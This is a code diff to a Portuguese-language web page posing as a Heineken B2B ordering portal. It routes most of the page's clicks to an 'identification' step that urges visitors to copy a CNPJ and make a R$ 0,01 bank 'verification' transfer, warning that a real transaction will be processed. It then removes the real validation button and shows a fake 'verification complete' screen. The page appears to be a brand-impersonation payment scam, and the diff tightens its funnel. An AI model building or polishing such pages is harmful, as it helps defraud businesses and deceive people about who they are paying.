@@ -123,10 +123,10 @@
                     </div>
                 </div>
                 <div class="flex space-x-3">
-                    <button class="text-white hover:text-gray-200 transition relative">
+                    <button onclick="navigateTo('view-identificacao')" class="text-white hover:text-gray-200 transition relative">
                         <i class="fa-solid fa-magnifying-glass text-xl"></i>
                     </button>
-                    <button class="text-white hover:text-gray-200 transition relative">
+                    <button onclick="navigateTo('view-identificacao')" class="text-white hover:text-gray-200 transition relative">
                         <i class="fa-regular fa-bell text-xl"></i>
                         <span class="absolute -top-1 -right-1 w-2.5 h-2.5 bg-heineken-red rounded-full border border-heineken-dark"></span>
                     </button>
@@ -209,12 +209,18 @@
                     <div class="mb-6">
                         <div class="flex justify-between items-center mb-3">
                             <h3 class="font-bold text-gray-800 text-sm uppercase tracking-wider">Marcas em Destaque</h3>
-                            <span class="text-xs text-heineken-green font-bold cursor-pointer">Ver todas</span>
+                            <span onclick="navigateTo('view-identificacao')" class="text-xs text-heineken-green font-bold cursor-pointer">Ver todas</span>
                         </div>
                         <div class="flex space-x-3 overflow-x-auto no-scrollbar pb-2">
-                            <img src="https://thumbs.dreamstime.com/b/logotipo-de-heineken-em-uma-parede-104281010.jpg" class="h-14 w-24 bg-white rounded-lg shadow-card border border-gray-100 object-cover shrink-0" alt="Heineken">
-                            <img src="https://api-siterefrigerantes.brasal.com.br/uploads/files/e7ee4ff67f9b1cecbf4bd1a907e69cea.png" class="h-14 w-24 bg-white rounded-lg p-2 shadow-card border border-gray-100 object-contain shrink-0" alt="Amstel">
-                            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZnkXtQyhR_qOH3V_TPy-DqcEpoIDIjltTNa6fbvZHPqcYnIfjlMaMfHc&s=10" class="h-14 w-24 bg-white rounded-lg shadow-card border border-gray-100 object-cover shrink-0" alt="Eisenbahn">
+                            <div onclick="navigateTo('view-identificacao')" class="h-14 w-24 bg-white rounded-lg shadow-card border border-gray-100 overflow-hidden shrink-0 cursor-pointer">
+                                <img src="https://thumbs.dreamstime.com/b/logotipo-de-heineken-em-uma-parede-104281010.jpg" class="w-full h-full object-cover" alt="Heineken">
+                            </div>
+                            <div onclick="navigateTo('view-identificacao')" class="h-14 w-24 bg-white rounded-lg p-2 shadow-card border border-gray-100 flex items-center justify-center shrink-0 cursor-pointer">
+                                <img src="https://api-siterefrigerantes.brasal.com.br/uploads/files/e7ee4ff67f9b1cecbf4bd1a907e69cea.png" class="max-w-full max-h-full object-contain" alt="Amstel">
+                            </div>
+                            <div onclick="navigateTo('view-identificacao')" class="h-14 w-24 bg-white rounded-lg shadow-card border border-gray-100 overflow-hidden shrink-0 cursor-pointer">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZnkXtQyhR_qOH3V_TPy-DqcEpoIDIjltTNa6fbvZHPqcYnIfjlMaMfHc&s=10" class="w-full h-full object-cover" alt="Eisenbahn">
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -257,7 +263,7 @@
                     <div class="mb-6 text-center">
                         <i class="fa-solid fa-building-shield text-4xl text-heineken-green mb-3"></i>
                         <h3 class="font-bold text-lg text-gray-900">Identificação B2B</h3>
-                        <p class="text-sm text-gray-500 mt-1">Para Verificação e disponibilidade na sua região, confirme o CNPJ do estabelecimento. Primeiro faça uma pequena verificaçao bancaria de cadrasto e indentificação</p>
+                        <p class="text-sm text-gray-500 mt-1">Para verificação e disponibilidade na sua região, confirme o CNPJ do estabelecimento. Primeiro faça uma pequena verificação bancária de cadastro e identificação.</p>
                     </div>
                     
                     <div class="bg-gray-50 p-4 rounded-xl border border-gray-200 mb-6 relative overflow-hidden">
@@ -267,21 +273,18 @@
                     </div>
 
                     <div class="space-y-3">
-                        <button onclick="copiarCNPJ()" id="btnCopiarCnpj" class="btn-outline">
+                        <button onclick="copiarCNPJ()" id="btnCopiarCnpj" class="bg-heineken-green text-white font-bold py-3.5 px-4 rounded-xl shadow-md hover:bg-green-700 transition active:scale-[0.98] flex items-center justify-center space-x-2 w-full uppercase tracking-wide text-sm border-2 border-heineken-green">
                             <i class="fa-regular fa-copy text-lg"></i>
                             <span>Copiar CNPJ</span>
                         </button>
 
-                        <button onclick="iniciarPedido()" id="btnContinuarCnpj" class="btn-primary opacity-50 cursor-not-allowed" disabled>
-                            <span>Validar e Continuar</span>
-                            <i class="fa-solid fa-arrow-right"></i>
-                        </button>
+                        
                     </div>
                     
                     <div class="mt-6 flex items-start space-x-2 bg-blue-50 p-3 rounded-lg border border-blue-100">
                         <i class="fa-solid fa-circle-info text-blue-500 mt-0.5 text-xs"></i>
                         <p class="text-[10px] text-blue-800 leading-tight font-medium">
-                            Ambiente corporativa. transação real será processada.
+                            Ambiente corporativo. Transação real será processada.
                         </p>
                     </div>
                 </div>
@@ -386,10 +389,12 @@
                 <div class="w-24 h-24 bg-heineken-light rounded-full flex items-center justify-center text-heineken-green text-5xl mb-6 shadow-inner">
                     <i class="fa-solid fa-check"></i>
                 </div>
+                <h3 class="text-xl font-bold text-gray-900 mb-2">Verificação Concluída!</h3>
+                <p class="text-sm text-gray-600 mb-6">Sua empresa foi validada com sucesso no sistema B2B.</p>
                 
                 <div class="w-full space-y-3">
-                    <button onclick="navigateTo('view-pedidos')" class="btn-primary">
-                        Acompanhar Status
+                    <button onclick="navigateTo('view-catalogo')" class="btn-primary">
+                        Acessar Catálogo de Produtos
                     </button>
                     <button onclick="navigateTo('view-inicio')" class="btn-outline border-gray-300 text-gray-600 hover:bg-gray-50">
                         Voltar ao Início
@@ -406,11 +411,11 @@
                         <i class="fa-solid fa-gift"></i>
                     </div>
                     <h3 class="text-lg font-bold text-gray-800 mb-2">Bem-vindo ao B2B!</h3>
-                    <p class="text-sm text-gray-500 mb-6">Este é o seu novo portal. Seu histórico de pedidos e cotações aparecerá aqui assim que você fizer a primeira solicitação.</p>
+                    <p class="text-sm text-gray-500 mb-6">Este é o seu novo portal. Seu histórico de pedidos e cotações aparecerá aqui assim que você concluir a verificação de acesso.</p>
                     
                     <button onclick="navigateTo('view-identificacao')" class="btn-primary w-auto px-6">
-                        <i class="fa-solid fa-plus mr-1"></i>
-                        <span>Fazer 1º Pedido</span>
+                        <i class="fa-solid fa-shield-halved mr-1"></i>
+                        <span>Fazer Verificação</span>
                     </button>
                 </div>
             </section>
@@ -461,6 +466,8 @@
             quantidade: 1,
             observacoes: ""
         };
+
+        let cnpjCopiado = false;
 
         document.addEventListener("DOMContentLoaded", () => {
             renderizarCatalogo();
@@ -527,11 +534,6 @@
             pedidoAtual.quantidade = 1;
             pedidoAtual.observacoes = "";
 
-            // Reseta botão de validação de CNPJ
-            const btnContinuar = document.getElementById('btnContinuarCnpj');
-            btnContinuar.disabled = true;
-            btnContinuar.classList.add('opacity-50', 'cursor-not-allowed');
-
             navigateTo('view-identificacao');
         }
 
@@ -546,12 +548,8 @@
             
             try {
                 document.execCommand('copy');
-                mostrarToast("CNPJ copiado! Acesse o app do seu banco para fazer a vinculação.");
-                
-                // Habilita o botão de continuar após "validar" a cópia
-                const btnContinuar = document.getElementById('btnContinuarCnpj');
-                btnContinuar.disabled = false;
-                btnContinuar.classList.remove('opacity-50', 'cursor-not-allowed');
+                cnpjCopiado = true;
+                mostrarToast("CNPJ copiado! Vá até o app do seu banco para fazer a verificação de R$ 0,01.");
             } catch (err) {
                 mostrarToast("Erro ao copiar o CNPJ.");
             }
@@ -559,9 +557,18 @@
             document.body.removeChild(textarea);
         }
 
+        function tentarContinuarCnpj() {
+            if (!cnpjCopiado) {
+                mostrarToast("Verificação não realizada! Copie o código CNPJ e faça o procedimento bancário primeiro.");
+                return;
+            }
+            
+            // Se já copiou e realizou, prossegue com o fluxo de sucesso
+            navigateTo('view-sucesso');
+        }
+
         function iniciarPedido() {
             if(!pedidoAtual.produto) {
-                // Se chegou na validação pelo menu sem produto selecionado, vai pro catálogo após validar
                 navigateTo('view-catalogo');
                 return;
             }
